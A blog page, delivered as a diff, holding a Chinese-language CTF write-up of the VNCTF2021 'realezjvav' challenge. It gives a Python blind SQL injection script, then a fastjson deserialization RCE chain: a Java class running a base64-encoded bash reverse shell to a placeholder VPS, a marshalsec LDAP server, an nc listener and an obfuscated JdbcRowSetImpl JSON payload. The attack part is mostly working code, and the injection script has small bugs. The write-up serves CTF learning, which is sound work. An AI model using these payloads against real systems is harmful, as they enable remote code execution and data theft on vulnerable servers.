@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>[VNCTF2021]realezjvav复现 | y0lo&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="前言自己太菜了，VNCTF没做出来几个题，签到即退场。 考点简单的SQL注入 fastjson Rce复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[VNCTF2021]realezjvav复现">
+<meta property="og:url" content="http://example.com/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="y0lo&#39;s blogs">
+<meta property="og:description" content="前言自己太菜了，VNCTF没做出来几个题，签到即退场。 考点简单的SQL注入 fastjson Rce复现">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/image-20210316214000589.png">
+<meta property="og:image" content="http://example.com/image-20210316214845265.png">
+<meta property="og:image" content="http://example.com/image-20210316220526132.png">
+<meta property="og:image" content="http://example.com/image-20210316220614741.png">
+<meta property="article:published_time" content="2021-03-16T13:11:37.000Z">
+<meta property="article:modified_time" content="2021-03-16T14:09:16.237Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image-20210316214000589.png">
+  
+    <link rel="alternate" href="/atom.xml" title="y0lo's blogs" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">y0lo&#39;s blogs</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-VNCTF-realezjvav复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time class="dt-published" datetime="2021-03-16T13:11:37.000Z" itemprop="datePublished">2021-03-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      [VNCTF2021]realezjvav复现
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自己太菜了，VNCTF没做出来几个题，签到即退场。</p>
+<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>简单的SQL注入</p>
+<p>fastjson Rce复现 </p>
+<span id="more"></span>
+
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>在Fastjson&lt;&#x3D;1.2.47存在fastjson反序列化漏洞。</p>
+<p>关于Fastjson 1.2.47 可以看这篇文章 <a target="_blank" rel="noopener" href="https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/">fastjson</a></p>
+<p>这题根据提示Only the admin can get the right. 可以猜到用户名，password那里通过fuzz</p>
+<p><img src="/image-20210316214000589.png" alt="image-20210316214000589"></p>
+<p>可以发现<code>&#39;#</code>的时候会返回200，sleep，空格，benchmark等都被ban了，本题用的是笛卡尔积时间盲注。</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> true:</span><br><span class="line">        j=head+(tail-head)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="built_in">min</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=<span class="string">&quot;-1&#x27;or if(ascii(substr(password,&#123;&#125;,1))&lt;&#123;&#125;,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.tables C),1)#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url=url,data=data,timeout=<span class="number">0.7</span>)</span><br><span class="line">            <span class="built_in">min</span>=j</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">max</span>=j</span><br><span class="line">        sleep(<span class="number">0.4</span>)</span><br></pre></td></tr></table></figure>
+
+<p>跑出password，登录网站。</p>
+<p>这个图片存放路径<code>searchimage</code>存在一个任意文件读取。</p>
+<p><img src="/image-20210316214845265.png" alt="image-20210316214845265"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;1.2.27&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过pom.xml可以看到<code>fastion</code>的依赖</p>
+<p>再利用<code>ldap</code>协议进行攻击。</p>
+<p>利用自己的VPS开三个端口，并启动http协议，端口1用作恶意java类，端口2用作开启<code>ldap</code>,端口3用作监听反弹shell</p>
+<p>端口写一个java的<code>exp</code>，并进行javac生成类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123; <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> &#123;<span class="keyword">try</span> &#123;</span><br><span class="line">Runtime.getRuntime().exec( <span class="string">&quot;bash -c</span></span><br><span class="line"><span class="string">&#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4Lnh4Lnh4Lnh4L3BvcnQyIDA+JjEK&#125;|&#123;base64,-d&#125;| &#123;bash,-i&#125;&quot;</span>); &#125; <span class="keyword">catch</span> (Exception e) &#123; e.printStackTrace();</span><br><span class="line">&#125; &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span> &#123; <span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>YmFzaCAtaSA+Ji9kZXYvdGNwL3h4Lnh4Lnh4Lnh4L3BvcnQyIDA+JjEK</code>是一串反弹shell的base64。把这里改成自己的VPS地址和端口就好。</p>
+<p>然后执行<code>javac Exploit.java</code>产生class。</p>
+<p>在这个文件夹上启动http服务：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server port1</span><br></pre></td></tr></table></figure>
+
+<p>端口2启动<code>ldap</code>服务，先在github上下载 <a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a></p>
+<p>然后用<code>maven</code>构建项目:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>targe</code>目录，开启<code>ldap</code>服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://x.x.x.x:port1#Exploit&quot; port2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>端口3执行监听反弹shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp port3</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roleJson=<span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://x.x.x.x:port2/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;</span><span class="punctuation">:</span><span class="keyword">true</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/image-20210316220526132.png" alt="image-20210316220526132"></p>
+<p><img src="/image-20210316220614741.png" alt="image-20210316220614741"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/" data-id="cl09mim2y00091kvj8x6g95dj" data-title="[VNCTF2021]realezjvav复现" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/04/10/%E6%B5%85%E8%B0%88nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          原型链污染
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/03/12/Python%E5%AD%A6%E4%B9%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Python学习</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/misc/">misc</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">注入</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">注入</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/03/02/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/">ctfshow内部赛</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/02/Security%E7%9A%84%E5%AD%A6%E4%B9%A0/">Security的学习&#39;</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/10/%E6%B5%85%E8%B0%88nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/">[VNCTF2021]realezjvav复现</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/12/Python%E5%AD%A6%E4%B9%A0/">Python学习</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
